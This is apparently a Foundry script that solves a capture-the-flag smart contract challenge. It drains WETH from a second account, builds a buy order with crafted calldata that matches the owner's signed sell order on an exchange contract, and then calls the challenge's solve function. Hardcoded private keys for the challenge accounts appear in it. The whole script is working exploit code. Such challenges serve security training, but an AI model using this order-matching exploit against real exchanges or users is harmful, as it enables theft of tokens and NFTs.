// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

import "src/Setup.sol";

contract Solution is Script {
    Setup setup;
    Exchange exchange;
    WETH weth;
    Toast toast;
    ToastNFT toastNFT;
    address owner;

    uint256 userPK;
    uint256 scamPK;

    uint256 ownerPK;

    function setUp() external {
        userPK = 0x26eb36e8654ba241e9c9caced427318c27aa7e9e763ede82a7e33cfb50406d7f;
        scamPK = 0xdf57089febbacf7ba0bc227dafbffa9fc08a93fdc68e1e42411a14efcf23656e;

        setup = Setup(0x3F933b9d194270a791E0efa39E5C1e12c9F4D57c);
        weth = setup.weth();
        exchange = setup.exchange();
        toast = setup.toast();
        owner = setup.owner();
        toastNFT = setup.toastNFT();
    }

    function run() external {
        // forge script script/Solution.s.sol:Solution --rpc-url http://0.0.0.0:12345/386eaaaa6c28/rpc -vvvvv --slow --via-ir --broadcast
        vm.startBroadcast(userPK);
        // cast send $(cast az) --private-key <user-pk> --rpc-url <rpc> --auth $(cast wallet sign-auth $(cast az) --private-key <scam-pk> --rpc-url <rpc>)
        (bool success, ) = payable(vm.addr(scamPK)).call{value: 0.1 ether}('');
        require(success);
        vm.stopBroadcast();

        vm.startBroadcast(scamPK);
        weth.transfer(vm.addr(userPK), weth.balanceOf(vm.addr(scamPK)));
        console2.log(weth.balanceOf(vm.addr(userPK)));
        vm.stopBroadcast();

        vm.startBroadcast(userPK);
        weth.approve(address(toast), type(uint256).max);

        Order memory sell = Order({
            exchange: address(exchange),
            maker: owner,
            salt: 0x0,
            taker: address(0),
            side: SaleKindInterface.Side.Sell,
            saleKind: SaleKindInterface.SaleKind.FixedPrice,
            target: address(toast),
            howToCall: AuthenticatedProxy.HowToCall(0),
            calldata_: '',
            staticTarget: address(0),
            paymentToken: address(weth),
            basePrice: 400e18,
            expirationTime: 0,
            feeMethod: FeeMethod(0),
            sig: setup.sellSig()
        });

        address[] memory addr = new address[](10);
        addr[0] = vm.addr(userPK);
        addr[1] = address(vm.addr(userPK));
        addr[2] = address(vm.addr(userPK));
        addr[3] = address(vm.addr(userPK));
        addr[4] = address(vm.addr(userPK));
        addr[5] = address(vm.addr(userPK));
        addr[6] = address(vm.addr(userPK));
        addr[7] = address(vm.addr(userPK));
        addr[8] = address(vm.addr(userPK));
        addr[9] = address(vm.addr(userPK));

        Order memory buy = Order({
            exchange: address(exchange),
            maker: vm.addr(userPK),
            salt: 100,
            taker: address(0),
            side: SaleKindInterface.Side.Buy,
            saleKind: SaleKindInterface.SaleKind.FixedPrice,
            target: address(toast),
            howToCall: AuthenticatedProxy.HowToCall(0),
            // calldata_: abi.encode(addr, abi.encodePacked(
            //     hex'4141414141414141414141414141414141414141',
            //     hex'4242424242424242424242424242424242424242',
            //     hex'4343434343434343434343434343434343434343',
            //     hex'4444444444444444444444444444444444444444',
            //     hex'4545454545454545454545454545454545454545',
            //     hex'4646464646464646464646464646464646464646',
            //     hex'4747474747474747474747474747474747474747',
            //     hex'4848484848484848484848484848484848484848',
            //     hex'4949494949494949494949494949494949494949',
            //     hex'4a4a4A4A4A4a4a4A4a4A4a4a4a4A4a4a4A4A4a4A',
            //     hex'4b4b4B4b4b4B4b4b4B4B4B4B4B4B4B4B4B4B4b4b',
            //     hex'4C4C4C4C4C4c4C4C4C4C4c4C4C4c4C4c4C4C4c4C',
            //     hex'4D4d4D4d4d4D4D4d4D4D4D4d4d4d4d4D4D4d4d4D',
            //     hex'4E4E4E4e4E4e4e4E4e4E4E4e4E4E4E4E4e4E4e4e',
            //     hex'4f4F4F4F4F4f4F4F4F4F4f4F4F4f4f4F4F4f4f4F',
            //     hex'5050505050505050505050505050505050505050'
            // )),
            calldata_: abi.encode(addr, abi.encodePacked(
                hex'0000000000000000',
                vm.addr(userPK),
                hex'000000000000000000000000',
                vm.addr(userPK),
                hex'000000000000000000000000',
                vm.addr(userPK),
                hex'000000000000000000000000',
                vm.addr(userPK),
                hex'000000000000000000000000',
                vm.addr(userPK),
                hex'000000000000000000000000',
                vm.addr(userPK),
                hex'000000000000000000000000',
                vm.addr(userPK),
                hex'000000000000000000000000',
                vm.addr(userPK),
                hex'000000000000000000000000',
                vm.addr(userPK),
                hex'000000000000000000000000',
                vm.addr(userPK),
                hex'00000000'
            )),
            staticTarget: address(0),
            paymentToken: address(weth),
            basePrice: 400e18,
            expirationTime: 0,
            feeMethod: FeeMethod(0),
            sig: ''
        });

        bytes32 hash = hashOrder(buy);

        bytes32 DOMAIN_TYPEHASH = 0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f;
        bytes32 domainHash = keccak256(abi.encode(
            DOMAIN_TYPEHASH,
            keccak256("Toast"),
            keccak256("0"),
            block.chainid,
            address(exchange)
        ));

        bytes32 digest = keccak256(
            abi.encodePacked(
                hex'1901',
                domainHash,
                hash
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPK, digest);
        buy.sig = abi.encodePacked(r, s, v);

        exchange.atomicMatch(buy, sell);

        console2.log(toastNFT.balanceOf(address(0xd578389f9C7dE8C4466d8a33C0cf7F70b64Cf35E), 1337));

        console2.log(setup.isSolved());
        setup.solve();
        console2.log(setup.isSolved());

        vm.stopBroadcast();
    }

    function hashOrder(Order memory order) internal pure returns (bytes32 hash) {
        bytes32 ORDER_TYPEHASH = 0xca2b31eece9789f8640037795ba5e3065ba8d82ef095c0f8c0f4310a0d1f96ea;
        bytes memory part1;
        bytes memory part2;
        {
            part1 = abi.encode(
                ORDER_TYPEHASH,
                order.exchange,
                order.maker,
                order.salt,
                order.taker,
                order.side,
                order.saleKind
            );
        }
        {
            part2 = abi.encode(
                order.target,
                order.howToCall,
                keccak256(order.calldata_),
                order.staticTarget,
                order.paymentToken,
                order.basePrice,
                order.expirationTime,
                order.feeMethod
            );
        }
        return keccak256(abi.encodePacked(part1, part2));
    }
}